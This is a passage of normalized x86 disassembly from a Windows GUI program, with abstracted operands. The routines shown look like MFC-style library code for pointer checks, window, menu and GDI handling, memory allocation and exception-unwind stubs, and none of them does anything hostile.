pop eax
retn
sub_40df17
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_40df33
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_40df4f
push esi
push 0x1
pop esi
push [ esp + 0x8 ]
call [ IsBadCodePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
ClosePrinter
jmp [ ClosePrinter@IAT ]
OpenPrinterA
jmp [ OpenPrinterA@IAT ]
sub_40e926
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push r--data
push eax
mov [ ebp - 0x4 ] rw-data
call sub_40cf90
sub_40e95f
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ eax ] edx
dec [ ecx + 0xc ]
mov [ ecx + 0x10 ] eax
jne r-xdata
retn 0x4
call sub_40e93f
sub_40e99c
mov eax [ esp + 0x8 ]
imul eax [ esp + 0xc ]
add eax 0x4
push eax
call sub_40ec97
pop ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov [ eax ] edx
mov [ ecx ] eax
retn 0xc
sub_40e9bc
test ecx ecx
je r-xdata
retn
push esi
mov esi [ ecx ]
push ecx
call sub_40ecc0
pop ecx
test esi esi
mov ecx esi
jne r-xdata
pop esi
sub_40e9f9
push esi
mov esi ecx
call sub_40ea85
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40ecc0
pop ecx
sub_40ea85
mov eax sub_413a80
call sub_40d394
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_40ea5a
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_40eafb
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ eax ] edx
dec [ ecx + 0xc ]
mov [ ecx + 0x10 ] eax
jne r-xdata
retn 0x4
call sub_40ea5a
sub_40ec7d
call sub_40e926
xor eax eax
retn
sub_40ecc0
push [ esp + 0x4 ]
call sub_404e2a
pop ecx
retn
sub_40eccb
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
retn 0x4
sub_40ecd7
cmp [ ecx + 0x4 ] 0x0
jle r-xdata
retn
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_40ed3e
call sub_40ed48
jmp sub_40ed57
sub_40ed48
push 0x40
push 0x50
mov ecx rw-data
call sub_40c934
retn
sub_40ed57
push sub_40ed63
call sub_40d431
pop ecx
retn
sub_40ed63
mov ecx rw-data
jmp sub_40c95c
sub_40ed6d
call sub_40ed77
jmp sub_40ed89
sub_40ed77
push 0x40
push 0x90
mov ecx rw-data
call sub_40c934
retn
sub_40ed89
push sub_40ed95
call sub_40d431
pop ecx
retn
sub_40ed95
mov ecx rw-data
jmp sub_40c95c
sub_40ed9f
call sub_40eda9
jmp sub_40edbb
sub_40eda9
push 0x40
push 0x110
mov ecx rw-data
call sub_40c934
retn
sub_40edbb
push sub_40edc7
call sub_40d431
pop ecx
retn
sub_40edc7
mov ecx rw-data
jmp sub_40c95c
sub_40edd1
call sub_40eddb
jmp sub_40eded
sub_40eddb
push 0x40
push 0x210
mov ecx rw-data
call sub_40c934
retn
sub_40eded
push sub_40edf9
call sub_40d431
pop ecx
retn
sub_40edf9
mov ecx rw-data
jmp sub_40c95c
sub_40eefe
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
pop esi
retn 0x4
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx esi
call sub_40ee85
sub_40f0a5
mov ecx [ ebp - 0x18 ]
call sub_40ecd7
mov eax r-xdata
retn
sub_40f173
mov eax ecx
push 0x1
pop ecx
xor edx edx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] edx
retn
sub_40f3ce
push 0x1
pop eax
retn 0x4
sub_40f3d4
mov eax 0x80029c4a
retn 0x8
sub_40f3dc
call sub_413126
mov eax [ eax + 0x4 ]
push 0x1
mov ecx eax
mov edx [ eax ]
call [ edx + 0x90 ]
retn
sub_40f3f1
call sub_413126
mov eax [ eax + 0x4 ]
push 0xffffffff
mov ecx eax
mov edx [ eax ]
call [ edx + 0x90 ]
retn
sub_40f406
mov eax r--data
retn
sub_40f40c
mov eax r--data
retn
sub_40f412
mov eax r--data
retn
sub_40f418
push 0x1
pop eax
retn
sub_40f41c
mov eax r--data
retn
sub_40f422
xor eax eax
retn 0x4
sub_40f427
mov eax r--data
retn
j_sub_40f5f7
jmp sub_40f5f7
sub_40f5f7
push r--data
call [ RegisterWindowMessageA@IAT ]
mov [ rw-data ] eax
retn
sub_40f608
call sub_40f612
jmp sub_40f61f
sub_40f612
push 0x0
mov ecx rw-data
call sub_40f73e
retn
sub_40f61f
push sub_40f62b
call sub_40d431
pop ecx
retn
sub_40f62b
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_410110
sub_40f646
call sub_40f650
jmp sub_40f65d
sub_40f650
push 0x1
mov ecx rw-data
call sub_40f73e
retn
sub_40f65d
push sub_40f669
call sub_40d431
pop ecx
retn
sub_40f669
test [ rw-data ] 0x2
jne r-xdata
retn
or [ rw-data ] 0x2
mov ecx rw-data
jmp sub_410110
sub_40f684
call sub_40f68e
jmp sub_40f69b
sub_40f68e
push 0xffffffff
mov ecx rw-data
call sub_40f73e
retn
sub_40f69b
push sub_40f6a7
call sub_40d431
pop ecx
retn
sub_40f6a7
test [ rw-data ] 0x4
jne r-xdata
retn
or [ rw-data ] 0x4
mov ecx rw-data
jmp sub_410110
sub_40f6c2
call sub_40f6cc
jmp sub_40f6d9
sub_40f6cc
push 0xfffffffe
mov ecx rw-data
call sub_40f73e
retn
sub_40f6d9
push sub_40f6e5
call sub_40d431
pop ecx
retn
sub_40f6e5
test [ rw-data ] 0x8
jne r-xdata
retn
or [ rw-data ] 0x8
mov ecx rw-data
jmp sub_410110
sub_40f722
push esi
mov esi ecx
call sub_410110
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40ecc0
pop ecx
sub_40f76a
push esi
mov esi [ esp + 0x8 ]
push [ esp + 0xc ]
push [ esi + 0x1c ]
call [ GetWindowRect@IAT ]
mov ecx esi
call sub_411cba
mov ecx [ esp + 0x10 ]
pop esi
mov [ ecx ] eax
retn 0xc
sub_40fac5
push 0x0
call sub_40fa2c
mov ecx eax
xor eax eax
test ecx ecx
je r-xdata
retn 0x4
push [ esp + 0x4 ]
add ecx 0x4
call sub_40eb46
sub_4100a4
push esi
mov esi [ esp + 0x8 ]
cmp [ esi + 0x28 ] 0x0
jne r-xdata
push 0x1
pop eax
pop esi
retn 0x4
push 0x1
call sub_411851
mov [ esi + 0x28 ] r--data
sub_4102bc
retn
sub_4102bd
cmp [ ecx + 0x1c ] 0x0
mov eax [ ecx ]
je r-xdata
jmp [ eax + 0xa4 ]
jmp [ eax + 0x58 ]
sub_410362
lea eax [ ecx + 0x28 ]
retn
sub_410366
push esi
mov esi ecx
call sub_413126
mov eax [ eax + 0x1034 ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn 0x4
push esi
push [ esp + 0xc ]
call eax
sub_4104b4
mov eax [ esp + 0x8 ]
push esi
push 0x0
mov esi ecx
push [ eax + 0xc ]
call sub_41108a
test eax eax
jne r-xdata
pop esi
retn 0x8
mov ecx esi
call sub_40fa05
sub_4107a3
mov eax r--data
retn
sub_410d9f
push esi
mov esi ecx
call sub_40f42d
mov [ esi ] r--data
mov [ esi + 0x28 ] 0x1
mov eax esi
pop esi
retn
sub_410db8
mov eax [ esp + 0x4 ]
mov [ ecx + 0x18 ] 0x1
mov [ ecx + 0x28 ] eax
retn 0x4
sub_41129e
cmp [ esp + 0x4 ] 0x0
jne r-xdata
xor eax eax
retn 0x8
call sub_412eef
test [ eax + 0xdf ] 0x40
jne r-xdata
push 0x1
call sub_410385
sub_41176e
mov eax [ ecx + 0x24 ]
and eax 0x10
retn
sub_411b08
xor eax eax
retn
sub_411b0b
push [ esp + 0x4 ]
mov ecx rw-data
call sub_40ca27
retn
sub_411ca3
push [ esp + 0xc ]
mov ecx [ ecx + 0x34 ]
push [ esp + 0xc ]
mov eax [ ecx ]
push [ esp + 0xc ]
call [ eax + 0x54 ]
retn 0xc
sub_411cba
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0x70 ]
push 0xfffffff0
push [ ecx + 0x1c ]
call [ GetWindowLongA@IAT ]
retn
sub_411cd4
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0x74 ]
push 0xffffffec
push [ ecx + 0x1c ]
call [ GetWindowLongA@IAT ]
retn
sub_411d3d
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0xa4 ]
push [ ecx + 0x1c ]
call [ IsWindowEnabled@IAT ]
retn
sub_411d58
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
push [ esp + 0x4 ]
mov ecx eax
call [ edx + 0xa8 ]
push [ esp + 0x4 ]
push [ ecx + 0x1c ]
call [ EnableWindow@IAT ]
jmp r-xdata
retn 0x4
sub_411d7f
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0xac ]
push [ ecx + 0x1c ]
call [ SetFocus@IAT ]
push eax
call sub_40fa9e
retn
sub_411f98
push 0x1
call sub_411f26
mov ecx eax
push [ esp + 0x4 ]
call sub_411b7f
retn 0x4
sub_411fad
push 0x0
call sub_411f26
mov ecx eax
xor eax eax
test ecx ecx
je r-xdata
retn 0x4
push [ esp + 0x4 ]
add ecx 0x4
call sub_40eb46
sub_411ff5
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
call sub_411fcb
push eax
call [ DestroyMenu@IAT ]
retn
xor eax eax
retn
sub_41200b
retn 0x4
sub_412125
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
retn 0x4
push eax
call [ DeleteObject@IAT ]
and [ esi ] 0x0
sub_4121c6
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn
sub_4121da
push esi
mov esi ecx
call sub_4122ae
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_40ecc0
pop ecx
sub_412268
push 0x1
call sub_4121f6
mov ecx eax
push [ esp + 0x4 ]
call sub_411b7f
retn 0x4
sub_4122e4
mov eax [ esp + 0x4 ]
mov [ ecx + 0x8 ] eax
retn 0x4
sub_4122ee
mov eax [ esp + 0x4 ]
mov [ ecx + 0x4 ] eax
retn 0x4
sub_4122f8
and [ ecx + 0x8 ] 0x0
retn
sub_4122fd
and [ ecx + 0x4 ] 0x0
retn
sub_41265f
push [ esp + 0x4 ]
push [ ecx + 0x4 ]
call [ GetClipBox@IAT ]
retn 0x4
sub_4126e1
push 0x1
call sub_41266f
mov ecx eax
push [ esp + 0x4 ]
call sub_411b7f
retn 0x4
sub_412720
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
call sub_4126f6
push eax
call [ DeleteObject@IAT ]
retn
xor eax eax
retn
sub_412978
call sub_412eef
mov eax [ eax + 0xc4 ]
retn
sub_412984
call sub_413126
xor ecx ecx
cmp [ eax + 0x2c ] ecx
sete cl
mov eax ecx
retn
sub_412994
mov eax r--data
retn
sub_41299a
call sub_4129a4
jmp sub_4129b6
sub_4129a4
push 0xf023
push 0x0
mov ecx rw-data
call sub_40c878
retn
sub_4129b6
push sub_4129c2
call sub_40d431
pop ecx
retn
sub_4129c2
mov ecx rw-data
jmp sub_40c8be
sub_4129cc
mov eax r--data
retn
sub_4129d2
call sub_4129dc
jmp sub_4129ee
sub_4129dc
push 0xf021
push 0x0
mov ecx rw-data
call sub_40c8c5
retn
sub_4129ee
push sub_4129fa
call sub_40d431
pop ecx
retn
sub_4129fa
mov ecx rw-data
jmp sub_40c90b
sub_412a38
mov edx [ ecx + 0x4 ]
mov eax [ esp + 0x4 ]
push esi
mov esi [ ecx ]
mov [ edx + eax ] esi
mov [ ecx ] eax
pop esi
retn 0x4
sub_412a4b
push esi
push [ esp + 0x8 ]
push 0x40
call [ LocalAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn 0x4
call sub_40e926
sub_412a69
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn 0x4
push [ esp + 0x4 ]
call [ LocalFree@IAT ]
sub_412d18
push esi
mov esi ecx
call sub_412d33
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_412a69
sub_412d33
retn
sub_412e49
mov eax ecx
or [ eax + 0xd4 ] 0xffffffff
or [ eax + 0x104 ] 0xffffffff
mov [ eax ] r--data
retn
sub_412e60
push esi
mov esi ecx
call sub_412e7b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_412a69
sub_412eef
push sub_412a04
mov ecx rw-data
call sub_412d34
retn
sub_412eff
call sub_412f09
jmp sub_412f0a
sub_412f09
retn
sub_412f0a
push sub_412f16
call sub_40d431
pop ecx
retn
sub_412f16
mov ecx rw-data
jmp j_sub_412dab
sub_412f83
push esi
mov esi ecx
call sub_412f9e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_412a69
j_sub_412dab
jmp sub_412dab
sub_413018
mov eax ecx
and [ eax + 0x8 ] 0x0
and [ eax + 0xc ] 0x0
mov [ eax ] r--data
mov [ eax + 0xc ] 0x54
mov [ eax + 0x28 ] sub_40ec7d
retn
sub_413037
push esi
mov esi ecx
call sub_413052
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_412a69
sub_413100
call sub_41310a
jmp sub_41310b
sub_41310a
retn
sub_41310b
push sub_413117
call sub_40d431
pop ecx
retn
sub_413126
push sub_412a04
mov ecx rw-data
call sub_412d34
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
retn
push sub_413179
mov ecx rw-data
call sub_412dc9
sub_41314c
call sub_413126
add eax 0x1070
push sub_413163
mov ecx eax
call sub_412d34
retn
sub_413163
push 0x3c
call sub_412a4b
test eax eax
je r-xdata
xor eax eax
retn
mov ecx eax
call sub_413018
retn
sub_4131a1
push esi
mov esi ecx
call j_sub_412f9e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_412a69
j_sub_412f9e
jmp sub_412f9e
sub_4131c1
push 0x30
call sub_412a4b
test eax eax
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
retn
sub_4131d6
push esi
mov esi ecx
call sub_4134c1
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_412a69
sub_4132a6
cmp [ rw-data ] 0x0
jne r-xdata
retn 0x4
mov eax [ esp + 0x4 ]
lea eax [ eax + eax * 2 ]
lea eax [ eax * 8 + rw-data ]
push eax
call [ LeaveCriticalSection@IAT ]
sub_4132c7
mov eax r--data
retn
sub_4133df
mov eax r--data
retn
sub_413425
push esi
mov esi ecx
call j_sub_410110
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_40ca27
j_sub_410110
jmp sub_410110
sub_41344a
mov eax r--data
retn
sub_413450
call sub_41345a
jmp sub_413469
sub_41345a
push 0x40
push 0x3c
mov ecx rw-data
call sub_40c934
retn
sub_413469
push sub_413475
call sub_40d431
pop ecx
retn
sub_413475
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_40c95c
sub_413502
call sub_41350c
jmp sub_41350d
sub_41350c
retn
sub_41350d
push sub_413519
call sub_40d431
pop ecx
retn
sub_413519
mov ecx rw-data
jmp j_sub_412dab
sub_413523
call sub_41352d
jmp sub_41352e
sub_41352d
retn
sub_41352e
push r-xdata
call sub_40d431
pop ecx
retn
sub_413544
call sub_41354e
jmp sub_413558
sub_41354e
mov ecx rw-data
jmp sub_4135c0
sub_413558
push sub_413564
call sub_40d431
pop ecx
retn
sub_413564
mov ecx rw-data
jmp sub_413987
sub_41359e
push esi
mov esi [ GetSystemMetrics@IAT ]
push 0x2
call esi
push 0x3
mov [ rw-data ] eax
call esi
and [ rw-data ] 0x0
mov [ rw-data ] eax
pop esi
retn
sub_41365b
mov eax ecx
mov [ eax ] r--data
retn
sub_413664
push esi
mov esi ecx
call sub_413991
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_412a69
sub_41367f
call sub_413689
jmp sub_41368a
sub_413689
retn
sub_41368a
push r-xdata
call sub_40d431
pop ecx
retn
sub_4136c3
jmp r-xdata
call sub_4136a0
mov [ rw-data ] eax
retn
sub_4136d3
push 0x8
call sub_40ec97
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
and [ eax + 0x4 ] 0x0
retn
sub_4136ed
mov eax r--data
retn
sub_4136f3
mov ecx rw-data
call sub_40c998
test eax eax
je r-xdata
xor eax eax
retn
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
retn
sub_41370f
push esi
mov esi ecx
call sub_41372f
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_40ca27
sub_41372f
mov eax sub_413c04
call sub_40d394
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_411ff5
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_413758
mov eax r--data
retn
sub_41375e
call sub_413768
jmp sub_413777
sub_413768
push 0x40
push 0x8
mov ecx rw-data
call sub_40c934
retn
sub_413777
push sub_413783
call sub_40d431
pop ecx
retn
sub_413783
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_40c95c
sub_41379e
mov eax r--data
retn
sub_4137a4
call sub_4137ae
jmp sub_4137c0
sub_4137ae
push 0xf022
push 0x0
mov ecx rw-data
call sub_40cd67
retn
sub_4137c0
push sub_4137cc
call sub_40d431
pop ecx
retn
sub_4137cc
mov ecx rw-data
jmp sub_40cdad
sub_4137d6
mov eax r--data
retn
sub_4137dc
call sub_4137e6
jmp sub_4137f8
sub_4137e6
push 0xf024
push 0x0
mov ecx rw-data
call sub_40cdb4
retn
sub_4137f8
push sub_413804
call sub_40d431
pop ecx
retn
sub_413804
mov ecx rw-data
jmp sub_40cdfa
sub_41380e
push 0x10
call sub_40ec97
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov ecx eax
call sub_4121c6
retn
sub_413825
mov eax r--data
retn
sub_41382b
push 0x8
call sub_40ec97
test eax eax
pop ecx
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
and [ eax + 0x4 ] 0x0
retn
sub_413845
mov eax r--data
retn
sub_413871
push esi
mov esi ecx
call j_sub_4122ae
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_40ca27
j_sub_4122ae
jmp sub_4122ae
sub_413896
mov eax r--data
retn
sub_41389c
mov ecx rw-data
call sub_40c998
test eax eax
je r-xdata
xor eax eax
retn
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
retn
sub_4138b8
push esi
mov esi ecx
call sub_4138d8
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
mov ecx rw-data
call sub_40ca27
sub_4138d8
mov eax sub_413c68
call sub_40d394
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_412720
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_413901
mov eax r--data
retn
sub_413907
call sub_413911
jmp sub_413920
sub_413911
push 0x40
push 0x10
mov ecx rw-data
call sub_40c934
retn
sub_413920
push sub_41392c
call sub_40d431
pop ecx
retn
sub_41392c
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_40c95c
sub_413947
call sub_413951
jmp sub_413960
sub_413951
push 0x40
push 0x8
mov ecx rw-data
call sub_40c934
retn
sub_413960
push sub_41396c
call sub_40d431
pop ecx
retn
sub_41396c
test [ rw-data ] 0x2
jne r-xdata
retn
or [ rw-data ] 0x2
mov ecx rw-data
jmp sub_40c95c
sub_413987
add ecx 0x50
push ecx
call sub_412125
retn
sub_4139be
call sub_40f15e
test eax eax
je r-xdata
push [ esp + 0x4 ]
call [ PostQuitMessage@IAT ]
retn 0x4
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
push 0x1
push 0x1
call eax
sub_4139e4
push [ ebp - 0x10 ]
call sub_412a69
retn
sub_4139ed
mov eax r--data
jmp sub_40d13d
sub_4139f8
mov eax r--data
jmp sub_40d13d
sub_413a04
lea ecx [ ebp - 0x10 ]
jmp sub_40ef78
sub_413a0c
mov eax r--data
jmp sub_40d13d
sub_413a18
mov eax r--data
jmp sub_40d13d
sub_413a24
mov ecx [ ebp - 0x10 ]
jmp sub_40c933
sub_413a2c
mov eax r--data
jmp sub_40d13d
sub_413a38
mov ecx [ ebp - 0x10 ]
jmp sub_40c933
sub_413a40
mov ecx [ ebp - 0x10 ]
add ecx 0x1070
jmp j_sub_412dab
sub_413a4e
mov eax r--data
jmp sub_40d13d
sub_413a58
mov ecx [ ebp - 0x10 ]
jmp sub_40c933
sub_413a60
mov eax r--data
jmp sub_40d13d
sub_413a6c
mov eax r--data
jmp sub_40d13d
sub_413a78
mov ecx [ ebp - 0x10 ]
jmp sub_40c933
sub_413a80
mov eax r--data
jmp sub_40d13d
sub_413a8c
mov ecx [ ebp - 0x10 ]
jmp sub_40c933
sub_413a94
mov eax r--data
jmp sub_40d13d
sub_413aa0
mov eax r--data
jmp sub_40d13d
sub_413aac
push [ ebp + 0x8 ]
call sub_40ecc0
pop ecx
retn
sub_413ab6
mov eax r--data
jmp sub_40d13d
sub_413ac0
mov eax r--data
jmp sub_40d13d
sub_413acc
mov ecx [ ebp - 0x10 ]
jmp sub_40f18d
sub_413ad4
mov eax r--data
jmp sub_40d13d
sub_413ae0
mov eax r--data
jmp sub_40d13d
sub_413aec
lea ecx [ ebp - 0x8 ]
jmp sub_40ccb1
sub_413af4
mov eax r--data
jmp sub_40d13d
sub_413b00
lea ecx [ ebp - 0x24 ]
jmp sub_4122ae
sub_413b08
lea ecx [ ebp - 0x60 ]
jmp sub_410110
sub_413b10
lea ecx [ ebp - 0x24 ]
jmp sub_4122ae
sub_413b18
mov eax r--data
jmp sub_40d13d
sub_413b24
lea ecx [ ebp - 0x48 ]
jmp sub_410110
sub_413b2c
mov eax r--data
jmp sub_40d13d
sub_413b38
push [ ebp - 0x10 ]
call sub_40c912
retn
sub_413b41
mov eax r--data
jmp sub_40d13d
sub_413b4c
push [ ebp - 0x10 ]
call sub_411b0b
pop ecx
retn
sub_413b56
mov eax r--data
jmp sub_40d13d
sub_413b60
push [ ebp - 0x10 ]
call sub_412a69
retn
sub_413b69
mov eax r--data
jmp sub_40d13d
sub_413b74
mov ecx [ ebp - 0x10 ]
jmp sub_40c933
sub_413b7c
mov eax r--data
jmp sub_40d13d
sub_413b88
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_40ea85
sub_413b93
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_40ea85
sub_413b9e
mov eax r--data
jmp sub_40d13d
sub_413ba8
mov eax r--data
jmp sub_40d13d
sub_413bb4
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_40ea85
sub_413bbf
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_40ea85
sub_413bca
mov eax r--data
jmp sub_40d13d
sub_413bd4
mov ecx [ ebp - 0x10 ]
jmp sub_40c933
sub_413bdc
mov eax r--data
jmp sub_40d13d
sub_413be8
push [ ebp + 0x8 ]
call sub_40ecc0
pop ecx
retn
sub_413bf2
mov eax r--data
jmp sub_40d13d
sub_413bfc
mov ecx [ ebp - 0x10 ]
jmp sub_40c933
sub_413c04
mov eax r--data
jmp sub_40d13d
sub_413c10
mov ecx [ ebp - 0x10 ]
jmp sub_40c933
sub_413c18
mov eax r--data
jmp sub_40d13d
sub_413c24
push [ ebp + 0x8 ]
call sub_40ecc0
pop ecx
retn
sub_413c2e
mov eax r--data
jmp sub_40d13d
sub_413c38
mov ecx [ ebp - 0x10 ]
jmp sub_40c933
sub_413c40
mov eax r--data
jmp sub_40d13d
sub_413c4c
push [ ebp + 0x8 ]
call sub_40ecc0
pop ecx
retn
sub_413c56
mov eax r--data
jmp sub_40d13d
sub_413c60
mov ecx [ ebp - 0x10 ]
jmp sub_40c933
sub_413c68
mov eax r--data
jmp sub_40d13d
sub_413c74
mov ecx [ ebp - 0x10 ]
jmp sub_40c933
sub_413c7c
mov eax r--data
jmp sub_40d13d
